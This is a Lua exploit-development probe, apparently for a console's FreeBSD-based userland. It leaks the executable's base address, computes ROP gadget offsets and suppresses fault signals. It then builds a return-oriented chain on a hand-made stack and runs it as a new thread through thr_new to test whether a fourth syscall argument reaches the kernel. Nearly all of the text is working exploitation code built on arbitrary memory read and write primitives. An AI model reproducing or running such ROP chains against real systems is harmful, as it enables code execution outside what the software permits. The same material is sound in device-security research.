-- CRASH_CLASS: MODERATE
-- PROBE 549a: does the loader stub pass the fourth syscall argument?
--
-- Context: the raw-child chain sets RDI, RSI, RDX and RAX. A fourth argument
-- needs R10 on FreeBSD's ABI, and eboot has no `pop r10` (548a) but does have
-- `pop rcx`. If the loader stub is a C-callable wrapper it moves RCX into R10
-- itself, and RCX is enough; if it is a bare syscall the fourth argument is
-- whatever R10 happens to hold.
--
-- The test is sysctl(202) with a real mib, a real out buffer and a real
-- oldlen pointer: arg four is the only one that can make it return 0. The
-- child exits with thr_exit afterwards; an earlier version ended the chain
-- with bare returns and the resulting child fault took the process down
-- before the parent printed its next line.

print("=== PROBE 549a: CHAIN ARG4 PLUMBING ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local mib = memory.alloc(0x20)
wd(N(mib), 1); wd(N(mib) + 4, 14); wd(N(mib) + 8, 1); wd(N(mib) + 12, 1)
local outbuf = memory.alloc(0x800)
local oldlen = memory.alloc(8)
wd(N(oldlen), 0x800)
wd(N(oldlen) + 4, 0)

local sc_thr_new = mk(455)
local CHAIN_MAX = 0x8000
local stk = memory.alloc(0x8000 + CHAIN_MAX)
local sb = N(stk)
local ss = 0x8000
local rsp = sb + ss - 8
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

emit_sysarch_preamble(emit)
emit(g_pop_rdi); emit(uint64(N(mib)))
emit(g_pop_rsi); emit(uint64(2))
emit(g_pop_rdx); emit(uint64(N(outbuf)))
emit(g_pop_rcx); emit(uint64(N(oldlen)))
emit(g_pop_rax); emit(uint64(202))
emit(stub)
emit(g_pop_rdi); emit(uint64(0))
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x08, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_ptr = memory.alloc(8)
wq(N(tid_ptr), uint64(0))
wq(pa + 0x30, tid_ptr)

print(string.format("[A] chain bytes=%d oldlen before=%08X", off, rd(N(oldlen)) or 0))
local ok, rv = pcall(function() return sc_thr_new(par, uint64(0x38)) end)
print(string.format("[B] thr_new ok=%s rv=%s", tostring(ok), tostring(N(rv))))
for i = 1, 600000 do end
print(string.format("[C] oldlen after=%08X out=%08X alive=%s",
    rd(N(oldlen)) or 0, rd(N(outbuf)) or 0, tostring(alive())))
print("=== DONE ===")
